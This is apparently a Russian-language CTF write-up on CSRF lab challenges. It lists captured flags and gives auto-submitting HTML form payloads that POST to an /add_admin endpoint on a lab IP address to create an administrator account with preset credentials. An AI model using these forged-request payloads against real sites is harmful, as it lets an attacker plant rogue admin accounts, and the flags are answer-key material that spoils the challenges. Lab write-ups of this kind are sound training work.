1. GET CSRF
Использоватся payload, где в message board передавалась картинка с get запросом, который исполнялся на стороне админа
Flag: NOW_YOU_KNOW_GET_CSRF
2. POST CSRF
Использовался payload, где в файле html была создана форма с отправнок при загрузке страницы, где было создано несколько полей, наименование которых соответствовало запросу и у этих полей были предустановленные value в виде логина, пароля и isAdmin
Flag: DID_YOU_LIKE_POST_CSRF
4. JSON CSRF

<form id="myForm" action="http://92.63.179.34/add_admin?username=1234567&password=1234567&isAdmin=yes&submit=Add+User" method="post"><input type="submit"></form> <script>var form = document.getElementById("myForm");  form.submit(); </script>
http://92.63.179.34/add_admin
<form id="myForm" action="http://92.63.179.34/add_admin" method="post"><input type="hidden" value="1234" name="username"><input type="hidden" value="1234" name="password"><input type="hidden" value="yes" name="isAdmin"><input type="hidden" value="Add+User" name="submit"></form> <script>document.forms[0].submit(); </script>
